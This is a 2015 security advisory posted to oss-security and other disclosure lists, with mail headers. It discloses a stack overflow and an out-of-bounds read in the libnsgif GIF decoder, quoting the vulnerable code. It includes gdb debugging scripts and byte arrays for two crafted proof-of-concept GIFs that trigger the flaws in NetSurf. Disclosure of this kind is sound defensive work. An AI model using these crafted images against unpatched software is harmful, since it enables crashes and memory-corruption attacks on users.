X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8252" "Wednesday" "16" "December" "2015" "20:28:07" "+0700" "Hans Jerry Illikainen" "hji@dyntopia.com" "<m1a8pazfo8.darpa@darpa.mil>" "324" "[oss-security] libnsgif: stack overflow (CVE-2015-7505) and out-of-bounds read (CVE-2015-7506)" nil nil nil "12" "2015121613:28:07" "[oss-security] libnsgif: stack overflow (CVE-2015-7505) and out-of-bounds read (CVE-2015-7506)" (number mark "U       hji@dyntopia Dec 16  324/8252  " thread-indent "\"[oss-security] libnsgif: stack overflow (CVE-2015-7505) and out-of-bounds read (CVE-2015-7506)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5832 invoked by uid 550); 16 Dec 2015 17:05:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22150 invoked from network); 16 Dec 2015 13:27:18 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=dyntopia-com.20150623.gappssmtp.com; s=20150623;
        h=from:to:subject:date:message-id:mime-version:content-type;
        bh=biZwEJ5VrgWWnIYYrYjsdoLKkar26WfQIu/qZPT+NgQ=;
        b=DH5GTsMn/FqEApucMbi1O2gNFUXYBn9SfYUNafX3PT2c166BeCn7iIE83tOgrtB55S
         ojaAxlavu8c1YvdzZ3reMTfVr7bYV0uXIi3BnDs7WgJ4b0SiP16/rTnDRyy6WhE1PK01
         cKZoCCkesY8EfixqWbe26eeWDElf7Mm3hUQ/+qjLTU9WKlg4ToefXca9pxf0xTnWqHvN
         aNQub1y+VaH0V6VDWwL0Lo2MSqU5/uAgySe1AH0pRGWPd+heresmF04yQglRZPmoXKF3
         p2JLAUpb0svXpssuS97wvlXxVgb6lXVT1C6GvtjkpVVWI0xqaX+pcVQXXyvskygdg6Id
         02TA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:to:subject:date:message-id:mime-version
         :content-type;
        bh=biZwEJ5VrgWWnIYYrYjsdoLKkar26WfQIu/qZPT+NgQ=;
        b=QV5s8RbEtaQh4+KUCHQIFEqJ/b6KcvUao3uTb8eK1S5zcEuTu0rboDIHXkvW9qbl5/
         6tLNBILMj1feBHOWLy42rSjxBfpldXjFevv/h0FtvhP75eksB4UhUVTEGibY3cQSItdp
         yjCMeOA5+cuHQL7ha51Bj1LcBdp3jVKhaGaP/81Su05ZpoS9eLoP3xtvAnVe7p2BOqKY
         UCYqBpG3HapXS21rsC24tWCRePmLKxaMjvsoKsT20MIoJK6qIqO01S6mVdSYRTXDRnxP
         amAVC9NJKH+CbHbznVpv+THpeRAzQ/NMG2CKI2qWrSpwsYVnepOSsOwrdhp0Jv2sDjr/
         WQFg==
X-Gm-Message-State: ALoCoQmLdYFnhzFKQAdZFr3OZbUwE8nJbIqct9cXy52VwnNJzzN0jVW3OiNVGx42Myn4drTZ76R2m0Pgxm5j/dzhHp6Vk8JIlw==
X-Received: by 10.28.19.84 with SMTP id 81mr12274138wmt.26.1450272426809;
        Wed, 16 Dec 2015 05:27:06 -0800 (PST)
From: Hans Jerry Illikainen <hji@dyntopia.com>
To: bugtraq@securityfocus.com, fulldisclosure@seclists.org, oss-security@lists.openwall.com
Date: Wed, 16 Dec 2015 20:28:07 +0700
Message-ID: <m1a8pazfo8.darpa@darpa.mil>
MIME-Version: 1.0
Content-Type: text/plain
Subject: [oss-security] libnsgif: stack overflow (CVE-2015-7505) and out-of-bounds read (CVE-2015-7506)


Overview
========

Libnsgif[1] is a decoding library for GIF images.  It is primarily
developed and used as part of the NetSurf project.

As of version 0.1.2, libnsgif is vulnerable to a stack overflow
(CVE-2015-7505) and an out-of-bounds read (CVE-2015-7506) due to the way
LZW-compressed GIF data is processed.


Details
=======

src/libnsgif.c #80..133:
,----
| /*    Maximum LZW bits available
| */
| #define GIF_MAX_LZW 12
| [...]
| static int table[2][(1 << GIF_MAX_LZW)];
| static unsigned char stack[(1 << GIF_MAX_LZW) * 2];
`----

src/libnsgif.c #423..628:
,----
| static gif_result gif_initialise_frame(gif_animation *gif) {
| [...]
|     if (gif_data[0] > GIF_MAX_LZW)
|         return GIF_DATA_ERROR;
| [...]
| }
`----


src/libnsgif.c #751..1053:
,----
| gif_result gif_decode_frame(gif_animation *gif, unsigned int frame) {
| [...]
|         /*    Initialise the LZW decoding
|         */
|         set_code_size = gif_data[0];
| [...]
|         code_size = set_code_size + 1;
|         clear_code = (1 << set_code_size);
|         end_code = clear_code + 1;
|         max_code_size = clear_code << 1;
|         max_code = clear_code + 2;
| [...]
| }
`----


src/libnsgif.c #1145..1169:
,----
| void gif_init_LZW(gif_animation *gif) {
| [...]
|     *stack_pointer++ =firstcode;
| }
`----


src/libnsgif.c #1172..1237:
,----
| static bool gif_next_LZW(gif_animation *gif) {
| [...]
|     code = gif_next_code(gif, code_size);
| [...]
|     incode = code;
|     if (code >= max_code) {
|         *stack_pointer++ = firstcode;
|         code = oldcode;
|     }
| 
|     /* The following loop is the most important in the GIF decoding cycle as every
|      * single pixel passes through it.
|      *
|      * Note: our stack is always big enough to hold a complete decompressed chunk. */
|     while (code >= clear_code) {
|         *stack_pointer++ = table[1][code];
|         new_code = table[0][code];
|         if (new_code < clear_code) {
|             code = new_code;
|             break;
|         }
|         *stack_pointer++ = table[1][new_code];
|         code = table[0][new_code];
|         if (code == new_code) {
|               gif->current_error = GIF_FRAME_DATA_ERROR;
|             return false;
|         }
|     }
| 
|     *stack_pointer++ = firstcode = table[1][code];
| [...]
|     oldcode = incode;
| [...]
| }
`----


CVE-2015-7505
=============

Since `gif_next_LZW()' writes onto the stack so long as `code' is at
least `clear_code', an overflow may eventually occur while processing a
maliciously crafted image.

Using NetSurf as an example:

,----
| ~/netsurf-all-3.3/netsurf$ gdb -x stack.py --args ./nsgtk stack.gif
| [...]
| stack overflow: ptr: 0x968903, end of stack: 0x968900 (+3)
| stack overflow: ptr: 0x968904, end of stack: 0x968900 (+4)
| stack overflow: ptr: 0x968905, end of stack: 0x968900 (+5)
| stack overflow: ptr: 0xf0000968906, end of stack: 0x968900 (+16492674416646)
| 
| Program received signal SIGSEGV, Segmentation fault.
| 0x000000000051a890 in gif_next_LZW (gif=0xbccc00) at src/libnsgif.c:1210
| 1210                    *stack_pointer++ = table[1][code];
| (gdb)
`----


stack.py:
,----
| class Breakpoint(gdb.Breakpoint):
|     def stop(self):
|         stack_pointer = get_hex("stack_pointer")
|         stack = get_hex("&stack")
|         stack_size = get_hex("sizeof stack / sizeof *stack")
|         stack_end = stack + stack_size
| 
|         table_size = get_hex("sizeof table / sizeof **table / 2")
|         code = get_hex("code")
| 
|         if stack_pointer > stack_end:
|             print("stack overflow: ptr: 0x%x, end of stack: 0x%x (+%d)" %
|                   (stack_pointer, stack_end, stack_pointer - stack_end))
|         if code >= table_size:
|             print("out-of-bounds read: code: %d (+%d)" %
|                   (code, code - table_size + 1))
|         return False
| 
| def get_hex(arg):
|     res = gdb.execute("print/x %s" % arg, to_string=True)
|     x = res.split(" ")[-1].strip()
|     return int(x, 16)
| 
| Breakpoint("netsurf-all-3.3/libnsgif/src/libnsgif.c:1210")
| Breakpoint("netsurf-all-3.3/libnsgif/src/libnsgif.c:1216")
| 
| gdb.execute("run")
`----


stack.gif:
,----
| unsigned char stack[] = {
|     /* GIF87a */
|     0x47, 0x49, 0x46, 0x38, 0x37, 0x61,
| 
|     /* gif_initialise() */
|     0x04, 0x00,     /* gif->width */
|     0x04, 0x33,     /* gif->height */
|     0x00,           /* gif->global_colours */
|     0x00,           /* gif->background_index */
|     0x00,           /* gif->aspect_ratio */
| 
|     /* gif_initialise_frame() */
|     0x2c,           /* GIF_IMAGE_SEPARATOR */
|     0x00, 0x00,     /* offset_x */
|     0x00, 0x00,     /* offset_y */
|     0x1b, 0x00,     /* width */
|     0x04, 0x00,     /* height */
|     0x00,           /* flags */
|     0x04,           /* code size */
|     0x0d,           /* block_size */
| 
|     /* image data */
|     0x10, 0xcb,
|     0x41, 0xf3,
|     0xf3, 0xf3,
|     0xf3, 0xf3,
|     0xf3, 0xf3,
|     0xf3, 0xf3,
|     0xf3,
| 
|     /* end of image data */
|     0x00,
| 
|     /* end of .gif */
|     0x3b
| };
`----


CVE-2015-7506
=============

If `set_code_size' is 0xc, `clear_code' is assigned a value of 4096.
Since the while-loop in `gif_next_LZW()' executes so long as `code >=
clear_code', an out-of-bounds read might occur due to `code' being used
to dereference `table' (2d array * 4096).  A boundary check exist in
that if `code >= max_code', it's assigned the value of `oldcode' --
however, the result may still exceed `max_code' due to the bookkeeping
of the *original* value:

src/libnsgif.c #1172..1237:
,----
| static bool gif_next_LZW(gif_animation *gif) {
| [...]
|     incode = code;
|     if (code >= max_code) {
|         *stack_pointer++ = firstcode;
|         code = oldcode;
|     }
| [...]
|     oldcode = incode;
| [...]
| }
`----

Again, using NetSurf as an example:

,----
| ~/netsurf-all-3.3/netsurf$ gdb -x oob.py --args ./nsgtk oob.gif
| [...]
| out-of-bounds read: code: 6670 (+2575)
| out-of-bounds read: code: 7999 (+3904)
`----


oob.py:
,----
| class Breakpoint(gdb.Breakpoint):
|     def stop(self):
|         stack_pointer = get_hex("stack_pointer")
|         stack = get_hex("&stack")
|         stack_size = get_hex("sizeof stack / sizeof *stack")
|         stack_end = stack + stack_size
| 
|         table_size = get_hex("sizeof table / sizeof **table / 2")
|         code = get_hex("code")
| 
|         if stack_pointer > stack_end:
|             print("stack overflow: ptr: 0x%x, end of stack: 0x%x (+%d)" %
|                   (stack_pointer, stack_end, stack_pointer - stack_end))
|         if code >= table_size:
|             print("out-of-bounds read: code: %d (+%d)" %
|                   (code, code - table_size + 1))
|         return False
| 
| def get_hex(arg):
|     res = gdb.execute("print/x %s" % arg, to_string=True)
|     x = res.split(" ")[-1].strip()
|     return int(x, 16)
| 
| Breakpoint("netsurf-all-3.3/libnsgif/src/libnsgif.c:1210")
| Breakpoint("netsurf-all-3.3/libnsgif/src/libnsgif.c:1216")
| 
| gdb.execute("run")
`----


oob.gif:
,----
| unsigned char oob[] = {
|     /* GIF87a */
|     0x47, 0x49, 0x46, 0x38, 0x37, 0x61,
| 
|     /* gif_initialise() */
|     0x04, 0x00,     /* gif->width */
|     0x04, 0x33,     /* gif->height */
|     0x00,           /* gif->global_colours */
|     0x00,           /* gif->background_index */
|     0x00,           /* gif->aspect_ratio */
| 
|     /* gif_initialise_frame() */
|     0x2c,           /* GIF_IMAGE_SEPARATOR */
|     0x00, 0x00,     /* offset_x */
|     0x00, 0x00,     /* offset_y */
|     0x1b, 0x00,     /* width */
|     0x04, 0x00,     /* height */
|     0x00,           /* flags */
|     0x0c,           /* code size */
|     0x0d,           /* block_size */
| 
|     /* image data */
|     0x10, 0xcb,
|     0x41, 0xf3,
|     0xf3, 0xf3,
|     0xf3, 0xf3,
|     0xf3, 0xf3,
|     0xf3, 0xf3,
|     0xf3,
| 
|     /* end of image data */
|     0x00,
| 
|     /* end of .gif */
|     0x3b
| };
`----


Solution
========

Both vulnerabilities are fixed in git HEAD[2].



Footnotes
_________

[1] [http://www.netsurf-browser.org/projects/libnsgif/]

[2] [http://source.netsurf-browser.org/libnsgif.git/]

 
Hans Jerry Illikainen
